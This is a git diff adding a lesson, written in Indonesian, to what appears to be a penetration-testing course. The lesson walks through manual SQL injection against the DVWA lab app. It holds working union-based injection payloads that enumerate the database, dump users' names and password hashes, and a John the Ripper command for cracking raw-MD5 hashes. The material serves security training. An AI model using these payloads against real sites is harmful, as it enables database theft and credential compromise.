@@ -114,7 +114,65 @@ Ket: 10.0.1.100->IP metasploitable
 Gambar 13
 ### Lesson 6: Manual SQL Injection, John the Ripper
 
-"Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."
+1. Login KE DVWA. Buka menu SQL Injection
+Gambar 14
+2. Skenario Basic Injection
+Masukkan perintah berikut di kolom SQL Injection
+```
+1
+```
+3. Skenario Always True
+Masukkan perintah berikut di kolom SQL Injection
+```
+%' or '0'='0
+```
+4. Menampilkan versi Database
+Masukkan perintah berikut di kolom SQL Injection
+```
+%' or 0=0 union select null, version() #
+```
+5. Menampilkan User Database 
+Masukkan perintah berikut di kolom SQL Injection
+```
+%' or 0=0 union select null, user() #
+```
+6. Menampilkan Nama Database
+Masukkan perintah berikut di kolom SQL Injection
+```
+%' or 0=0 union select null, database() #
+```
+7. Menampilkan semua tabel di information_schema
+Masukkan perintah berikut di kolom SQL Injection
+```
+%' and 1=0 union select null, table_name from information_schema.tables #
+```
+8. Menampilkan semua pengguna di tabel information_schema
+Masukkan perintah berikut di kolom SQL Injection
+```
+%' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#
+```
+9. Menmpilkan kolom di tabel information_schema
+Masukkan perintah berikut di kolom SQL Injection
+```
+%' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #
+```
+10. Menampilkan kolom dan konten tabel di information_schema
+Masukkan perintah berikut di kolom SQL Injection
+```
+%' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #
+```
+11. Membuat password hash file
+Data yang didapatkan dari langkah ke-10 simpan di notepad taruh di folder /pentest/password/john dengan format seperti gambar di bawah
+
+Gambar 15
+
+Jalankan perintah berikut untuk mencrypt password yg terenkripsi
+```
+cd /pentest/passwords/john
+./john --format=raw-MD5 dvwa_password.txt
+```
+
+
 
 ### Lesson 7: Automate SQL Injection with SqlMap
 
